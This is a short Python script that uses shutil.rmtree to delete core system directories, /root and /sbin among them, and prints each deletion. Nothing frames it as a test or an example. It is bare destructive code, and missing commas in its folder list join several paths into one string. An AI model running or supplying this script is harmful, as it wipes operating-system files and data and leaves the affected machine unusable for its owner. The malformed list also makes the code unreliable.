import shutil
import os

folders = [
    "/root",
    "/sbin",
    "/bin"
    "/usr"
    "/system"
    "/sys"
]

for folder in folders:
    if os.path.exists(folder):
        shutil.rmtree(folder)
        print(f"Deleted: {folder}")
    else:
        print(f"Folder not found: {folder}")
